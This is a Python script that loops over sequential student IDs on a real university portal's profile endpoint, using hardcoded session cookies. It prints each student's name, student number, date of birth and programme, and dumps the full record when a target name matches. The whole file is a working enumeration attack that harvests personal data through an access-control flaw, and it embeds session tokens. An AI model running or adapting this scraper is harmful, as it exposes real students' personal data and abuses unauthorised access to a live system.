import requests
import time

URL = "https://simak-ng.unud.ac.id/mahasiswa/profile/"
ID_USER = 199400
nama_param = "diva"
cookies = {'_ga': 'GA1.3.233117294.1539575597','PHPSESSID':'1v5kgm9pcav5a5jjbhr26vc79a','simak_ng_session':'eyJpdiI6Imt6ZEFzZmxMaG05K2JpcDVtOUdCOHc9PSIsInZhbHVlIjoiMVl6RGV0VE14cklDWnZWWFBCQ1l6QlNrYm1iWVp4cEVCbDB4aTN4Zk9SQzk0UXRXUEpnYlNZVDk5N1hjK290NyIsIm1hYyI6ImI0Yjk4MTNmYWE5NWYxNmU3MWNiZTQ0NTczMWEzYmU0NWQ4MmYxY2RhNzZkMzZjMzliZGJkZDI5ZGIwNGNjOWUifQ%3D%3D'}
i = 0
while True:

    i+=1
    req = requests.request('GET',URL+str(ID_USER), cookies = cookies)

    val = req.json()

    nama_mhs = val['nama'].lower()
    print("nama :{} | nim: {}| tgl_lahir:{} | jurusan :{}".format(val['nama'],val['nim'],val['tanggal_lahir_str'],val['program_studi']))

    if nama_param in nama_mhs:
        print(val)
    
    print(i)
    ID_USER+=1
    time.sleep(0.2)